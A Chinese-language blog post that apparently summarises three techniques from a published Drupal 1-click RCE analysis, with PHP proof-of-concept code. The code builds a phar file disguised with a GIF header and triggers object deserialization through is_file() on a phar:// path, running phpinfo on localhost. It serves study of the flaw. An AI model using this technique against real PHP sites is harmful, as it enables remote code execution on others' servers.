---
title: Drupal 1-click to RCE漏洞利用的三个小技巧
date: 2019-04-22 22:15:48
tags:
---

在[Seebug](https://paper.seebug.org)上看到的《[Drupal 1-click to RCE 分析](https://paper.seebug.org/897/)》这篇关于Drupal的漏洞分析，感觉很精彩，用到了三个很有意思的技巧点。

自己总结一下：

### 1. preg_replace() /u 模式下的 PREG_BAD_UTF8_ERROR
PHP官网对于`/u`通配符的解释是：

```
u (PCRE_UTF8)
此修正符打开一个与 perl 不兼容的附加功能。 模式和目标字符串都被认为是 utf-8 的。 无效的目标字符串会导致 preg_* 函数什么都匹配不到； 无效的模式字符串会导致 E_WARNING 级别的错误。 PHP 5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效（resp. PCRE 7.3 2007-08-28）。 以前就被认为是无效的 UTF-8。
```

就是说如果遇到非法的ut-8字符，会导致函数什么都匹配不到，最终返回null。

如果文件名中，如果出现了\x80到\xff的字符时，PHP就会抛出PREG_BAD_UTF8_ERROR。

测试代码：

```
<?php
$test = "hello";
$subject = "Hello world".$_GET['a'];
$a = preg_replace("/\d/u", $test, $subject);
var_dump($a);
```
传递正常字符，页面返回正常：

![](/uploads/drupal2.png)

当传递的参数为`a=%fe`，`$a`返回`null`。

![](/uploads/drupal3.png)


### 2. HTML 当中a标签可以设置打开文件的type

这个目前还没搞明白，因为测试的时候发现：除了IE会执行，其它的（Firefox和Chrome）都是提示下载。

### 3. phar反序列化RCE
2018年BlackHat大会上的Sam Thomas分享的File Operation Induced Unserialization via the “phar://” Stream Wrapper议题，[原文地址](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf )。

提到PHP反序列化漏洞(PHP对象注入)，以前是如下思路：
1. 寻找`unserialize($param)`方法,溯源`$param`是否可控。
2. 如果`$param`可控，再去寻找可以被注入的危险对象。
3. 构造POP链，生成恶意反序列化字符串，实现代码注入，达到目的。

明显条件[1]作为前提，如果条件[1]不成立，那么后面无法进行。

phar反序列化RCE 为[1]实现了另外一个入口。

《[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)》这篇文章分析的很好。

phar 文件允许用户自定义`meta-data`文件头，而在phar文件内部，这个的存储恰好是序列化格式。

**php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化**。

测试一下：

http://localhost/create.php

```
<?php

class DangerClass{

    public $_fn_close = "phpinfo";

    public function __destruct()
    {
        call_user_func($this->_fn_close);
    }
}

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头，这里是为了后盖后缀名图片格式绕过
$o = new DangerClass();
$phar->setMetadata($o); //将自定义meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```
用以上脚本生成恶意的phar文件,注意需要先修改php.ini 设置 `phar.readonly = Off`。因为安全问题，只能修改php.ini设置，在php脚本当中通过`ini_set()`直接设置不成立。

存在漏洞代码如下：

http://localhost/test.php

```
<?php

class DangerClass{

    public $_fn_close = "phpinfo";

    public function __destruct()
    {
        call_user_func($this->_fn_close);
    }
}

if(isset($_GET['file']) && is_file($_GET['file']))
{
	echo "exists.";
}
else
{
	echo "No file.";
}
?>
```

访问 `http://localhost/test.php?file=phar://phar.phar` 触发PHPinfo()。
![](/uploads/drupal1.png)

以上反序列化漏洞的触发点是函数`is_file()`，其内部对phar文件的`meta-data`进行了反序列化，触发了漏洞。

**php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化**。

注：phar是php 5.3以后的功能。

### 参考

[Drupal 1-click to RCE 分析](https://paper.seebug.org/897/)

[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)

[A SERIES OF UNFORTUNATE IMAGES: DRUPAL 1-CLICK TO RCE EXPLOIT CHAIN DETAILED](https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed)